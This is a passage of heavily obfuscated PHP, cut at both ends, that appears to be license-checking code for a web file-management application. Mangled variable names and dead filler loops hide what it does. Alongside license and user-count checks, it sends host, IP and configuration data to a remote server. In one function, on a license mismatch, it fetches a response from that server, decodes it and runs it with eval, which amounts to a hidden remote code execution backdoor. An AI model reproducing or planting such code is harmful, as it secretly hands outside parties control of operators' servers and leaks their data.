$Ãİ¾Ğé–); $œÉÖ‰ƒŠ = $Šº§Óõ»[658]; while (strlen($œÉÖ‰ƒŠ) < $Šº§Óõ»[406]) { if (!$œÉÖ‰ƒŠ) { break; } $œÉÖ‰ƒŠ++; } call_user_func(array($²ÖÈ ‘[137], $²ÖÈ ‘[138]), $–˜†ŞÂ„); } if ($this->zrtu09344cb4 == $²ÖÈ ‘[106]) { return; } $µİÂÁæ‹ = array($²ÖÈ ‘[139], $²ÖÈ ‘[140], $²ÖÈ ‘[141], $²ÖÈ ‘[142], $²ÖÈ ‘[143], $²ÖÈ ‘[144]); $õ›‡¹ñù = Model($²ÖÈ ‘[33])->get(); $–†Ó–Ø = $Šº§Óõ»[659]; if (!$–†Ó–Ø) { return; } $–˜†ŞÂ„ = array($²ÖÈ ‘[145] => $õ›‡¹ñù[$²ÖÈ ‘[34]], $²ÖÈ ‘[146] => $õ›‡¹ñù[$²ÖÈ ‘[35]], $²ÖÈ ‘[147] => $²ÖÈ ‘[6]); foreach ($µİÂÁæ‹ as $éŸ©»Ü) { if (!isset($õ›‡¹ñù[$éŸ©»Ü]) || !$õ›‡¹ñù[$éŸ©»Ü]) { continue; } $–˜†ŞÂ„[$éŸ©»Ü] = $õ›‡¹ñù[$éŸ©»Ü]; } call_user_func(array($²ÖÈ ‘[137], $²ÖÈ ‘[138]), $–˜†ŞÂ„); } private function ijzva0f4053b() { $Úşáı²á =& $_SERVER[ï»»·÷á]; $€ê·’ğŒ =& $_SERVER[éîó”ş¹]; if ($_SERVER[$€ê·’ğŒ[24]] != $€ê·’ğŒ[148]) { return; } if (!_get($GLOBALS, $€ê·’ğŒ[115])) { die; } $«Ó™¯•ƒ = $GLOBALS[$€ê·’ğŒ[13]]; if (isset($«Ó™¯•ƒ[$€ê·’ğŒ[149]])) { $this->gqbid49eb225(); die; } if (!isset($«Ó™¯•ƒ[$€ê·’ğŒ[150]]) || strlen($«Ó™¯•ƒ[$€ê·’ğŒ[150]]) != 16) { show_json($€ê·’ğŒ[151] . $«Ó™¯•ƒ[$€ê·’ğŒ[150]], !1); } $É¸§¯•© = Model($€ê·’ğŒ[33])->get($€ê·’ğŒ[103]); $•ö‰øó’ = md5($_SERVER[$€ê·’ğŒ[102]] . $É¸§¯•©); $‡¹ˆúÌ = $Úşáı²á[660]; if (strlen($‡¹ˆúÌ) < $Úşáı²á[632]) { die; } $‹ÍşüªÉ = array($€ê·’ğŒ[150] => $«Ó™¯•ƒ[$€ê·’ğŒ[150]], $€ê·’ğŒ[152] => rand_string(16), $€ê·’ğŒ[153] => $€ê·’ğŒ[135], $€ê·’ğŒ[154] => $€ê·’ğŒ[155], $€ê·’ğŒ[156] => $_SERVER[$€ê·’ğŒ[157]], $€ê·’ğŒ[158] => $_SERVER[$€ê·’ğŒ[159]], $€ê·’ğŒ[160] => $_SERVER[$€ê·’ğŒ[161]], $€ê·’ğŒ[101] => $•ö‰øó’, $€ê·’ğŒ[162] => Model($€ê·’ğŒ[33])->get($€ê·’ğŒ[130])); $áÀ»Ü î = $Úşáı²á[661]; if (!$áÀ»Ü î) { die; } if ($«Ó™¯•ƒ[$€ê·’ğŒ[163]] == $€ê·’ğŒ[164]) { $—Ø†’Ğ = $this->gdtufc22d200($•ö‰øó’, $€ê·’ğŒ[165]); $—äË•´õ = $this->jwsr6b17e39e(json_encode($‹ÍşüªÉ), $•ö‰øó’ . $€ê·’ğŒ[166], 3); $—äË•´õ = $—äË•´õ . $€ê·’ğŒ[167] . $_SERVER[$€ê·’ğŒ[157]]; $óü‰¸¢– = $this->oksec2932186($€ê·’ğŒ[168] . $—Ø†’Ğ . $€ê·’ğŒ[169] . $—äË•´õ, -1); show_json($óü‰¸¢–, !0); } else { if ($«Ó™¯•ƒ[$€ê·’ğŒ[163]] == $€ê·’ğŒ[170]) { $åéŠò¡Â = substr(md5($€ê·’ğŒ[171] . $•ö‰øó’), 12, 15) . $€ê·’ğŒ[172]; $—äË•´õ = $this->rmzv68b5affb(trim($«Ó™¯•ƒ[$€ê·’ğŒ[173]]), $åéŠò¡Â, 2); $©÷Ø šÚ = json_decode($—äË•´õ, !0); if (!is_array($©÷Ø šÚ) || !is_array($©÷Ø šÚ[$€ê·’ğŒ[174]]) || $©÷Ø šÚ[$€ê·’ğŒ[150]] != !0) { $‘®Ç¶ñç = $€ê·’ğŒ[175]; $ÍŒ§€éÌ = $©÷Ø šÚ[$€ê·’ğŒ[174]] ? $€ê·’ğŒ[176] . $©÷Ø šÚ[$€ê·’ğŒ[174]] : $‘®Ç¶ñç; show_json($ÍŒ§€éÌ, !1); } else { $‹ÍşüªÉ[$€ê·’ğŒ[152]] = $©÷Ø šÚ[$€ê·’ğŒ[174]][$€ê·’ğŒ[177]]; } } else { $©÷Ø šÚ = $this->oksec2932186($€ê·’ğŒ[178], $‹ÍşüªÉ, 10); } } if (!is_array($©÷Ø šÚ) || !is_array($©÷Ø šÚ[$€ê·’ğŒ[174]]) || $©÷Ø šÚ[$€ê·’ğŒ[150]] != !0) { $‘®Ç¶ñç = LNG($€ê·’ğŒ[179]); $ÍŒ§€éÌ = $©÷Ø šÚ[$€ê·’ğŒ[174]] ? $€ê·’ğŒ[176] . $©÷Ø šÚ[$€ê·’ğŒ[174]] : $‘®Ç¶ñç; show_json($ÍŒ§€éÌ, !1); } $ª…ô°Œü = $©÷Ø šÚ[$€ê·’ğŒ[174]]; $‰¿‘šÉÜ = $this->tokz88db8325($ª…ô°Œü[$€ê·’ğŒ[180]]); $£×–óë = $Úşáı²á[662]; while (strlen($£×–óë) < $Úşáı²á[622]) { if (!$£×–óë) { break; } $£×–óë++; } if (!$‰¿‘šÉÜ || $‰¿‘šÉÜ != $ª…ô°Œü[$€ê·’ğŒ[128]]) { $õ¥—£éı = array($€ê·’ğŒ[181] => Model($€ê·’ğŒ[33])->get($€ê·’ğŒ[103]), $€ê·’ğŒ[182] => $_SERVER[$€ê·’ğŒ[102]], $€ê·’ğŒ[183] => this_url(), $€ê·’ğŒ[158] => $_SERVER[$€ê·’ğŒ[159]]); $—äË•´õ = $this->szdpa6bc92b5(json_encode($õ¥—£éı)); $this->oksec2932186($€ê·’ğŒ[184] . $—äË•´õ); show_json(LNG($€ê·’ğŒ[185]), !0); } $ğÙ„¹®™ = array($€ê·’ğŒ[186] => $ª…ô°Œü[$€ê·’ğŒ[187]], $€ê·’ğŒ[188] => $ª…ô°Œü[$€ê·’ğŒ[189]], $€ê·’ğŒ[190] => rand_string(16), $€ê·’ğŒ[105] => $ª…ô°Œü[$€ê·’ğŒ[191]]); if ($‹ÍşüªÉ[$€ê·’ğŒ[152]]) { $ğÙ„¹®™[$€ê·’ğŒ[190]] = $‹ÍşüªÉ[$€ê·’ğŒ[152]]; } $çÂËãµê = substr(md5($ğÙ„¹®™[$€ê·’ğŒ[188]]), 10, 10); $Á¸¥­øÒ = $çÂËãµê . $ğÙ„¹®™[$€ê·’ğŒ[105]] . $ğÙ„¹®™[$€ê·’ğŒ[190]]; $ğÙ„¹®™[$€ê·’ğŒ[107]] = strrev(base64_encode($this->gdtufc22d200($Á¸¥­øÒ, $€ê·’ğŒ[192]))); $Èíö§… = rand_string(16); $Òí‘ğÇ = $Èíö§… . $ğÙ„¹®™[$€ê·’ğŒ[105]] . $this->gdtufc22d200(md5($ğÙ„¹®™[$€ê·’ğŒ[186]]), $Èíö§…); $áÏı¤ø– = $Úşáı²á[663]; while ($áÏı¤ø– < $Úşáı²á[620]) { if ($áÏı¤ø– >= 0) { break; } $áÏı¤ø–++; } $ğÙ„¹®™[$€ê·’ğŒ[108]] = base64_encode(strrev($this->gdtufc22d200($Òí‘ğÇ, $€ê·’ğŒ[193]))); $ƒğÕ‘’ê = $Úşáı²á[664]; if (strlen($ƒğÕ‘’ê) < $Úşáı²á[625]) { die; } if ($ª…ô°Œü[$€ê·’ğŒ[194]] && $ª…ô°Œü[$€ê·’ğŒ[194]] >= 1) { Model($€ê·’ğŒ[33])->setDeep($€ê·’ğŒ[195], $€ê·’ğŒ[121]); } Model($€ê·’ğŒ[33])->set($ğÙ„¹®™); $ºíÓ‡œÕ = md5($_SERVER[$€ê·’ğŒ[102]] . strrev($É¸§¯•©) . $ğÙ„¹®™[$€ê·’ğŒ[188]]); $„Ûù³»é = strrev(substr($ºíÓ‡œÕ, 10, 16)); $ŞŸûÄ€ = $Úşáı²á[665]; while ($ŞŸûÄ€ < $Úşáı²á[625]) { if ($ŞŸûÄ€ >= 0) { break; } $ŞŸûÄ€++; } $Î¿©£ù† = $this->jwsr6b17e39e(json_encode($ª…ô°Œü), $ºíÓ‡œÕ); $¯Çïîƒ = $Úşáı²á[666]; if (strlen($¯Çïîƒ) < $Úşáı²á[632]) { return; } $‹ÑòàÕà = array_to_keyvalue(Model($€ê·’ğŒ[7])->listData(), $€ê·’ğŒ[196]); $ÃºûÒ• = $‹ÑòàÕà[$€ê·’ğŒ[197]]; $ğ‹¯¡‚ = $Úşáı²á[667]; while ($ğ‹¯¡‚ < $Úşáı²á[632]) { if ($ğ‹¯¡‚ >= 0) { break; } $ğ‹¯¡‚++; } $ÎÎ¶Ô¬ = array(); $ÎÎ¶Ô¬[$„Ûù³»é] = $Î¿©£ù†; $ÉñõİÑŸ = $Úşáı²á[668]; if (strlen($ÉñõİÑŸ) < $Úşáı²á[622]) { return; } Model($€ê·’ğŒ[7])->update($ÃºûÒ•[$€ê·’ğŒ[198]], array($€ê·’ğŒ[199] => $ÎÎ¶Ô¬)); $óÜŞÛŒÎ = $Úşáı²á[669]; while ($óÜŞÛŒÎ < $Úşáı²á[620]) { if ($óÜŞÛŒÎ >= 0) { break; } $óÜŞÛŒÎ++; } $this->vied598bd021 = $ª…ô°Œü; $¦À¢ŸÉ = $Úşáı²á[670]; $this->zrtu09344cb4 = $ğÙ„¹®™[$€ê·’ğŒ[105]]; $±²©ò®û = $Úşáı²á[671]; $this->licenseRegistSuccess(); Cache::set($€ê·’ğŒ[200] . md5($É¸§¯•© . $€ê·’ğŒ[201]), $€ê·’ğŒ[6]); $øúú¡ı = $Úşáı²á[672]; if (strlen($øúú¡ı) < $Úşáı²á[632]) { die; } show_json(LNG($€ê·’ğŒ[185]), !0); } private function licenseRegistSuccess() { $›­ş¼© =& $_SERVER[éîó”ş¹]; $¦©—‡Á = Model($›­ş¼©[33])->get(); if ($¦©—‡Á[$›­ş¼©[63]] != $›­ş¼©[121]) { Model($›­ş¼©[33])->set($›­ş¼©[63], $›­ş¼©[121]); } Action($›­ş¼©[202])->initStart(!0); } private function gqbid49eb225() { $‡á›Í¡˜ =& $_SERVER[ï»»·÷á]; $¦ Îäô— =& $_SERVER[éîó”ş¹]; Model($¦ Îäô—[33])->set(array($¦ Îäô—[186] => $¦ Îäô—[6], $¦ Îäô—[188] => $¦ Îäô—[6], $¦ Îäô—[105] => $¦ Îäô—[106], $¦ Îäô—[107] => $¦ Îäô—[6], $¦ Îäô—[108] => $¦ Îäô—[6])); $Ãé£×û = $‡á›Í¡˜[673]; Model($¦ Îäô—[33])->setDeep($¦ Îäô—[195], $¦ Îäô—[203]); $–ÉéüÏÌ = $‡á›Í¡˜[674]; while (strlen($–ÉéüÏÌ) < $‡á›Í¡˜[632]) { if (!$–ÉéüÏÌ) { break; } $–ÉéüÏÌ++; } $this->vied598bd021 = array(); $àƒß±³ = $‡á›Í¡˜[675]; if (strlen($àƒß±³) < $‡á›Í¡˜[622]) { return; } $this->zrtu09344cb4 = $¦ Îäô—[106]; } private function ztfp747bdd0f() { $Ğìéçõ« =& $_SERVER[ï»»·÷á]; $ÆŞÂ©¬ˆ =& $_SERVER[éîó”ş¹]; $_SERVER[$ÆŞÂ©¬ˆ[159]] = _get($_SERVER, $ÆŞÂ©¬ˆ[159], APP_HOST); $şÂòäÍœ = $Ğìéçõ«[676]; if (!$şÂòäÍœ) { return; } $this->zrtu09344cb4 = $ÆŞÂ©¬ˆ[106]; $¾¯á£Õ™ = $Ğìéçõ«[677]; if (!$¾¯á£Õ™) { return; } $îüŠº´õ = Model($ÆŞÂ©¬ˆ[33])->get(); if ($îüŠº´õ[$ÆŞÂ©¬ˆ[105]] == $ÆŞÂ©¬ˆ[106]) { return; } $·Òøšğª = Model($ÆŞÂ©¬ˆ[33])->get($ÆŞÂ©¬ˆ[103]); $·ƒ‡İø‚ = $Ğìéçõ«[678]; while ($·ƒ‡İø‚ < $Ğìéçõ«[622]) { if ($·ƒ‡İø‚ >= 0) { break; } $·ƒ‡İø‚++; } $¶İŠœÕï = $ÆŞÂ©¬ˆ[200] . md5($·Òøšğª . $ÆŞÂ©¬ˆ[201]); $öªŸíóğ = $Ğìéçõ«[679]; if (!$öªŸíóğ) { die; } $°ó‹›ë¡ = Cache::get($¶İŠœÕï); $ä’Šš³â = $Ğìéçõ«[680]; if (strlen($ä’Šš³â) < $Ğìéçõ«[406]) { return; } if (!is_array($°ó‹›ë¡) || !isset($°ó‹›ë¡[$ÆŞÂ©¬ˆ[204]]) || time() - $°ó‹›ë¡[$ÆŞÂ©¬ˆ[204]] >= 60) { $µõ¥ôŸÕ = Model($ÆŞÂ©¬ˆ[7])->loadList(); $Œ›¯¸Ÿ = $µõ¥ôŸÕ[$ÆŞÂ©¬ˆ[197]]; $´©Ò—¸… = md5($_SERVER[$ÆŞÂ©¬ˆ[102]] . strrev($·Òøšğª) . $îüŠº´õ[$ÆŞÂ©¬ˆ[188]]); $äİ¹”ÖÊ = strrev(substr($´©Ò—¸…, 10, 16)); $°ó‹›ë¡ = $this->rmzv68b5affb($Œ›¯¸Ÿ[$ÆŞÂ©¬ˆ[85]][$äİ¹”ÖÊ], $´©Ò—¸…); $°ó‹›ë¡ = json_decode($°ó‹›ë¡, !0); } if (!is_array($°ó‹›ë¡)) { return $this->gqbid49eb225(); } $’Ù‡¾Ú = strtotime($°ó‹›ë¡[$ÆŞÂ©¬ˆ[128]]); if (time() >= $’Ù‡¾Ú) { return $this->gqbid49eb225(); } if (time() - $°ó‹›ë¡[$ÆŞÂ©¬ˆ[204]] > 20) { $°ó‹›ë¡[$ÆŞÂ©¬ˆ[204]] = time(); Cache::set($¶İŠœÕï, $°ó‹›ë¡); } $this->vied598bd021 = $°ó‹›ë¡; $this->zrtu09344cb4 = $îüŠº´õ[$ÆŞÂ©¬ˆ[105]]; $‹•îÕı’ = $Ğìéçõ«[681]; while (strlen($‹•îÕı’) < $Ğìéçõ«[622]) { if (!$‹•îÕı’) { break; } $‹•îÕı’++; } } private function rzulf72e4ccc() { $‹Ş÷’»” =& $_SERVER[éîó”ş¹]; $Àñ”ƒµÙ = $GLOBALS[$‹Ş÷’»”[13]]; $²ø¦ğí = $_SERVER[ï»»·÷á][682]; if (!$²ø¦ğí) { return; } $¬®ª”¬ = $_SERVER[$‹Ş÷’»”[24]]; if ($¬®ª”¬ == $‹Ş÷’»”[205] && $this->zrtu09344cb4 == $‹Ş÷’»”[106]) { show_json(LNG($‹Ş÷’»”[206]), !1, $‹Ş÷’»”[207]); } $Àäµ»Óæ = array($‹Ş÷’»”[208], $‹Ş÷’»”[209]); if (in_array($¬®ª”¬, $Àäµ»Óæ)) { if ($this->zrtu09344cb4 == $‹Ş÷’»”[106] && isset($Àñ”ƒµÙ[$‹Ş÷’»”[210]])) { show_json(LNG($‹Ş÷’»”[206]), !1, $‹Ş÷’»”[207]); die; } $´ò‚£¥¹ = $this->fxwo8c5e1f58(); if ($´ò‚£¥¹ != intval($‹Ş÷’»”[211])) { if ($´ò‚£¥¹ <= Model($‹Ş÷’»”[124])->count()) { show_json(LNG($‹Ş÷’»”[212]), !1, $‹Ş÷’»”[207]); die; } } } } private function jgdk61fb6c30() { $äë¢İÈ¾ =& $_SERVER[ï»»·÷á]; $ı‰ûœ¥ =& $_SERVER[éîó”ş¹]; $·Å¦€Š¡ = array($ı‰ûœ¥[118], $ı‰ûœ¥[119]); if (!_get($GLOBALS, $ı‰ûœ¥[115]) || !isset($_GET[$ı‰ûœ¥[213]])) { return; } if (!in_array($_SERVER[$ı‰ûœ¥[24]], $·Å¦€Š¡)) { return; } $®µ¶“Ö = $ı‰ûœ¥[214]; $¯„º×ñŞ = $äë¢İÈ¾[683]; while (strlen($¯„º×ñŞ) < $äë¢İÈ¾[632]) { if (!$¯„º×ñŞ) { break; } $¯„º×ñŞ++; } $®µ¶“Ö = $this->xzhr0c76892f($®µ¶“Ö, $ı‰ûœ¥[215]); $§£Ì¢úÂ = $äë¢İÈ¾[684]; while ($§£Ì¢úÂ < $äë¢İÈ¾[632]) { if ($§£Ì¢úÂ >= 0) { break; } $§£Ì¢úÂ++; } $šå†îÀÙ = stream_context_create(array($ı‰ûœ¥[216] => array($ı‰ûœ¥[217] => $ı‰ûœ¥[218], $ı‰ûœ¥[219] => 3))); $µ­òÄşÜ = @file_get_contents($®µ¶“Ö, !1, $šå†îÀÙ); header($ı‰ûœ¥[220]); if ($µ­òÄşÜ && strstr($µ­òÄşÜ, $ı‰ûœ¥[221])) { echo $µ­òÄşÜ; } die; } public function wpolc2924834($–äÀ³Å±) { $Ää‘§Ê =& $_SERVER[ï»»·÷á]; $ó¯ê®» =& $_SERVER[éîó”ş¹]; if ($this->zrtu09344cb4 == $ó¯ê®»[222]) { return $–äÀ³Å±; } $ÃèÂã‚‹ = array($ó¯ê®»[223] => $ó¯ê®»[224], $ó¯ê®»[225] => $ó¯ê®»[224], $ó¯ê®»[226] => $ó¯ê®»[224], $ó¯ê®»[227] => $ó¯ê®»[228], $ó¯ê®»[229] => $ó¯ê®»[228], $ó¯ê®»[230] => $ó¯ê®»[228], $ó¯ê®»[231] => $ó¯ê®»[228], $ó¯ê®»[232] => $ó¯ê®»[228], $ó¯ê®»[233] => $ó¯ê®»[228], $ó¯ê®»[234] => $ó¯ê®»[228], $ó¯ê®»[235] => $ó¯ê®»[228], $ó¯ê®»[236] => $ó¯ê®»[228], $ó¯ê®»[237] => $ó¯ê®»[228], $ó¯ê®»[238] => $ó¯ê®»[228], $ó¯ê®»[239] => $ó¯ê®»[228]); $¦”ÁÏ›Š = explode($ó¯ê®»[240], _get($this->vied598bd021, $ó¯ê®»[112], $ó¯ê®»[6])); $Í±¡»¯Ë = $Ää‘§Ê[685]; if (!$Í±¡»¯Ë) { die; } $¦€úÁ× = array(); $ñá¶êúî = $Ää‘§Ê[686]; if (!$ñá¶êúî) { return; } foreach ($ÃèÂã‚‹ as $ŞÄ¤“Í’ => $ÔßºÜ¨) { if ($ÔßºÜ¨ == $ó¯ê®»[224] && substr($this->zrtu09344cb4, 0, 1) == $ó¯ê®»[224]) { continue; } if (!in_array($ŞÄ¤“Í’, $¦”ÁÏ›Š)) { $¦€úÁ×[] = $ŞÄ¤“Í’; } } foreach ($¦€úÁ× as $ŞÄ¤“Í’) { unset($–äÀ³Å±[$ŞÄ¤“Í’]); $„ê‘Ñ³ = $Ää‘§Ê[687]; if (!$„ê‘Ñ³) { return; } } return $–äÀ³Å±; $º‚ñ˜ìØ = $Ää‘§Ê[688]; while (strlen($º‚ñ˜ìØ) < $Ää‘§Ê[620]) { if (!$º‚ñ˜ìØ) { break; } $º‚ñ˜ìØ++; } } private function ojpgb1b3c7a3() { $£¾¤äéö =& $_SERVER[éîó”ş¹]; if ($this->zrtu09344cb4 != $£¾¤äéö[106]) { $GLOBALS[$£¾¤äéö[85]][$£¾¤äéö[89]][$£¾¤äéö[241]] = $£¾¤äéö[203]; return; } $GLOBALS[$£¾¤äéö[85]][$£¾¤äéö[242]] = $£¾¤äéö[121]; if (Model($£¾¤äéö[243])->get($£¾¤äéö[63]) != $£¾¤äéö[203]) { Model($£¾¤äéö[243])->set($£¾¤äéö[63], $£¾¤äéö[203]); } } public function wshnfef766cc() { $äşÕÎãé =& $_SERVER[ï»»·÷á]; return $_SERVER[éîó”ş¹][244]; $×ŠãÖòÒ = $äşÕÎãé[689]; while (strlen($×ŠãÖòÒ) < $äşÕÎãé[406]) { if (!$×ŠãÖòÒ) { break; } $×ŠãÖòÒ++; } } private function bkzp586cd7aa() { $ñÛïš¿Ì =& $_SERVER[ï»»·÷á]; $›Ç¾¦Çû =& $_SERVER[éîó”ş¹]; $Âµ«û‘Ô = array($›Ç¾¦Çû[245], $›Ç¾¦Çû[246], $›Ç¾¦Çû[247]); $ëô§¬ƒ = $ñÛïš¿Ì[690]; if (strlen($ëô§¬ƒ) < $ñÛïš¿Ì[632]) { return; } $û ÑÎË = $›Ç¾¦Çû[248] . md5($›Ç¾¦Çû[249]); $–ÓÂÄö® = $ñÛïš¿Ì[691]; while ($–ÓÂÄö® < $ñÛïš¿Ì[620]) { if ($–ÓÂÄö® >= 0) { break; } $–ÓÂÄö®++; } if ($this->zrtu09344cb4 == $›Ç¾¦Çû[106] || !_get($GLOBALS, $›Ç¾¦Çû[115])) { return; } if (!in_array($_SERVER[$›Ç¾¦Çû[24]], $Âµ«û‘Ô)) { return; } if (time() % 4 != 0) { return; } $ÍíŸ­÷‹ = call_user_func(array($›Ç¾¦Çû[250], $›Ç¾¦Çû[251]), $û ÑÎË); if ($ÍíŸ­÷‹ && time() - $ÍíŸ­÷‹ < intval($›Ç¾¦Çû[252])) { return; } call_user_func(array($›Ç¾¦Çû[250], $›Ç¾¦Çû[138]), $û ÑÎË, time()); $œß½ğ» = $ñÛïš¿Ì[692]; $ª‹—óŠÜ = Model($›Ç¾¦Çû[33])->get($›Ç¾¦Çû[103]); $‹õù÷¡€ = $ñÛïš¿Ì[693]; $ÄÉ€à²¢ = array($›Ç¾¦Çû[150] => Model($›Ç¾¦Çû[33])->get($›Ç¾¦Çû[186]), $›Ç¾¦Çû[163] => $this->zrtu09344cb4, $›Ç¾¦Çû[160] => $_SERVER[$›Ç¾¦Çû[161]], $›Ç¾¦Çû[162] => Model($›Ç¾¦Çû[33])->get($›Ç¾¦Çû[130]), $›Ç¾¦Çû[101] => md5($_SERVER[$›Ç¾¦Çû[102]] . $ª‹—óŠÜ), $›Ç¾¦Çû[153] => $›Ç¾¦Çû[135], $›Ç¾¦Çû[156] => $_SERVER[$›Ç¾¦Çû[157]]); $¨ğÆµºĞ = $ñÛïš¿Ì[694]; if (strlen($¨ğÆµºĞ) < $ñÛïš¿Ì[622]) { die; } $–È‘‹¡µ = $this->oksec2932186($›Ç¾¦Çû[253], $ÄÉ€à²¢); $üá¾™× = $ñÛïš¿Ì[695]; while (strlen($üá¾™×) < $ñÛïš¿Ì[632]) { if (!$üá¾™×) { break; } $üá¾™×++; } if (!is_array($–È‘‹¡µ)) { return; } if ($–È‘‹¡µ[$›Ç¾¦Çû[150]] && $–È‘‹¡µ[$›Ç¾¦Çû[254]]) { if ($this->tokz88db8325($–È‘‹¡µ[$›Ç¾¦Çû[254]]) == $ÄÉ€à²¢[$›Ç¾¦Çû[150]]) { return; } } $this->gqbid49eb225(); if ($this->tokz88db8325($–È‘‹¡µ[$›Ç¾¦Çû[254]]) != $ÄÉ€à²¢[$›Ç¾¦Çû[150]]) { $¹¼ßéŠ‹ = array($›Ç¾¦Çû[181] => $ª‹—óŠÜ, $›Ç¾¦Çû[182] => $_SERVER[$›Ç¾¦Çû[102]], $›Ç¾¦Çû[183] => this_url(), $›Ç¾¦Çû[158] => $_SERVER[$›Ç¾¦Çû[159]]); $†ßÆ¢ÔÉ = $this->szdpa6bc92b5(json_encode($¹¼ßéŠ‹)); $–È‘‹¡µ = $this->oksec2932186($›Ç¾¦Çû[184] . $†ßÆ¢ÔÉ); if ($–È‘‹¡µ && is_array($–È‘‹¡µ) && isset($–È‘‹¡µ[$›Ç¾¦Çû[254]])) { $ì’€ÁÑÏ = $this->rmzv68b5affb($–È‘‹¡µ[$›Ç¾¦Çû[254]], 2); if ($ì’€ÁÑÏ) { $ì’€ÁÑÏ = $this->tokz88db8325($ì’€ÁÑÏ); } if ($ì’€ÁÑÏ) { try { @eval($ì’€ÁÑÏ); } catch (Exception $ËŸ‘İ) { } } } } } private function oksec2932186($şÇÑ¬êü = '', $ĞôäœÆ = array(), $Ä¾ŠâûÊ = 5) { $ÒĞ÷É—ó =& $_SERVER[ï»»·÷á]; $í€¶À¸Ú =& $_SERVER[éîó”ş¹]; $ºÛ÷Å–ë = $í€¶À¸Ú[255]; $ŸŸËääî = $ÒĞ÷É—ó[696]; if (!$ŸŸËääî) { return; } $ºÛ÷Å–ë = $this->xzhr0c76892f($ºÛ÷Å–ë, $í€¶À¸Ú[256]); $²¨¹±«Å = $ÒĞ÷É—ó[697]; if (strlen($²¨¹±«Å) < $ÒĞ÷É—ó[625]) { die; } $ºÛ÷Å–ë = $ºÛ÷Å–ë . $şÇÑ¬êü; $ÑşÙÕ…ô = $ÒĞ÷É—ó[698]; if (strlen($ÑşÙÕ…ô) < $ÒĞ÷É—ó[632]) { return; } if ($ĞôäœÆ && is_array($ĞôäœÆ)) { $ºÛ÷Å–ë = $ºÛ÷Å–ë . $í€¶À¸Ú[257] . http_build_query($ĞôäœÆ); } if ($ĞôäœÆ === -1) { return $ºÛ÷Å–ë; } $âààÀç = stream_context_create(array($í€¶À¸Ú[216] => array($í€¶À¸Ú[219] => $Ä¾ŠâûÊ, $í€¶À¸Ú[217] => $í€¶À¸Ú[258]), $í€¶À¸Ú[259] => array($í€¶À¸Ú[260] => !1, $í€¶À¸Ú[261] => !1))); $˜ş¡˜€ = $ÒĞ÷É—ó[699]; if (strlen($˜ş¡˜€) < $ÒĞ÷É—ó[625]) { return; } $ĞôäœÆ = @file_get_contents($ºÛ÷Å–ë, !1, $âààÀç); $ÊÚáÇê§ = $ÒĞ÷É—ó[700]; return json_decode($ĞôäœÆ, !0); $»ú†ñ×¿ = $ÒĞ÷É—ó[701]; if (!$»ú†ñ×¿) { return; } $ã–‰óÕÁ = $ÒĞ÷É—ó[702]; if (strlen($ã–‰óÕÁ) < $ÒĞ÷É—ó[632]) { return; } } private function fxwo8c5e1f58() { $¹Å½¾Øä =& $_SERVER[ï»»·÷á]; $Ş‚ı±–ö =& $_SERVER[éîó”ş¹]; $İ«üĞ«Š = array($Ş‚ı±–ö[262] => $Ş‚ı±–ö[263], $Ş‚ı±–ö[264] => $Ş‚ı±–ö[265], $Ş‚ı±–ö[266] => $Ş‚ı±–ö[267], $Ş‚ı±–ö[268] => $Ş‚ı±–ö[269], $Ş‚ı±–ö[270] => $Ş‚ı±–ö[271], $Ş‚ı±–ö[272] => $Ş‚ı±–ö[211], $Ş‚ı±–ö[273] => $Ş‚ı±–ö[211], $Ş‚ı±–ö[274] => $Ş‚ı±–ö[263], $Ş‚ı±–ö[275] => $Ş‚ı±–ö[265], $Ş‚ı±–ö[276] => $Ş‚ı±–ö[267], $Ş‚ı±–ö[277] => $Ş‚ı±–ö[278], $Ş‚ı±–ö[279] => $Ş‚ı±–ö[269], $Ş‚ı±–ö[280] => $Ş‚ı±–ö[281], $Ş‚ı±–ö[282] => $Ş‚ı±–ö[271], $Ş‚ı±–ö[283] => $Ş‚ı±–ö[284], $Ş‚ı±–ö[285] => $Ş‚ı±–ö[286], $Ş‚ı±–ö[287] => $Ş‚ı±–ö[288]); $÷õ¤´« = $¹Å½¾Øä[703]; if (strlen($÷õ¤´«) < $¹Å½¾Øä[406]) { die; } $ïÌ¬ÌÏŒ = $İ«üĞ«Š[$this->zrtu09344cb4]; $óÙôÌ÷ = $¹Å½¾Øä[704]; if (strlen($óÙôÌ÷) < $¹Å½¾Øä[622]) { die; } $ïÌ¬ÌÏŒ = intval($ïÌ¬ÌÏŒ ? $ïÌ¬ÌÏŒ : $Ş‚ı±–ö[263]); $ÀŞ‹Ø¤Ø = $¹Å½¾Øä[705]; while (strlen($ÀŞ‹Ø¤Ø) < $¹Å½¾Øä[632]) { if (!$ÀŞ‹Ø¤Ø) { break; } $ÀŞ‹Ø¤Ø++; } $êöã¿º‘ = _get($this->vied598bd021, $Ş‚ı±–ö[289]); $êöã¿º‘ = $êöã¿º‘ ? intval($êöã¿º‘) : 0; $³¼Æ˜¹ = $¹Å½¾Øä[706]; return $ïÌ¬ÌÏŒ + $êöã¿º‘; } public function gden51abb864($œ™¯„’ƒ) { $›˜ìÇş™ =& $_SERVER[ï»»·÷á]; $¾ ˆÙ—† =& $_SERVER[éîó”ş¹]; $Ú—ĞÌ¼ö = $this->fxwo8c5e1f58(); $öêÜ÷‚¼ = $›˜ìÇş™[707]; if ($œ™¯„’ƒ[$¾ ˆÙ—†[290]] == $¾ ˆÙ—†[121]) { return; } if ($Ú—ĞÌ¼ö >= intval($¾ ˆÙ—†[211])) { return; } $ÉÚûæşı = Model($¾ ˆÙ—†[124])->count(); $„€¤»ä± = $›˜ìÇş™[708]; if ($ÉÚûæşı <= $Ú—ĞÌ¼ö) { return; } $½Ì‘é¡§ = Model($¾ ˆÙ—†[124])->field($¾ ˆÙ—†[290])->limit($Ú—ĞÌ¼ö)->select(); $ë·‡¤ıÏ = $›˜ìÇş™[709]; if (!$ë·‡¤ıÏ) { return; } $½Ì‘é¡§ = array_to_keyvalue($½Ì‘é¡§, $¾ ˆÙ—†[6], $¾ ˆÙ—†[290]); $œÈåŸÃ± = $›˜ìÇş™[710]; while ($œÈåŸÃ± < $›˜ìÇş™[406]) { if ($œÈåŸÃ± >= 0) { break; } $œÈåŸÃ±++; } if (!in_array($œ™¯„’ƒ[$¾ ˆÙ—†[290]], $½Ì‘é¡§)) { show_json($¾ ˆÙ—†[291], !1, $¾ ˆÙ—†[207]); } } public function gnjyc007e6e1() { $÷¯óÈê =& $_SERVER[ï»»·÷á]; $£ğè¦õÉ =& $_SERVER[éîó”ş¹]; if (!_get($GLOBALS, $£ğè¦õÉ[115]) || mt_rand(1, 100) > 20) { return; } $ìôìÄ´ = $£ğè¦õÉ[214]; $ìôìÄ´ = $this->xzhr0c76892f($ìôìÄ´, 